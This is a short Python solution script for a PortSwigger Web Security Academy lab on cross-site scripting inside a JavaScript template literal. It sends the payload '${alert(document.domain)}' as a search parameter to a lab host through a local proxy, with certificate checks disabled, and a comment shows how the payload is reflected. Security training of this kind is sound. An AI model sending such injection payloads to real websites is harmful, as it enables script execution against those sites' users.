# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac6a1f401eb663f8801bb2e400810038.web-security-academy.net"
url = scheme + host
payload = "${alert(document.domain)}"
params = {"search": payload}

requests.get(url, verify=verify, proxies=proxies, params=params)

# Successful payload:
# <script>
#     var message = `0 search results for '${alert(document.domain)}'`;
#     document.getElementById('searchMessage').innerText = message;
# </script>
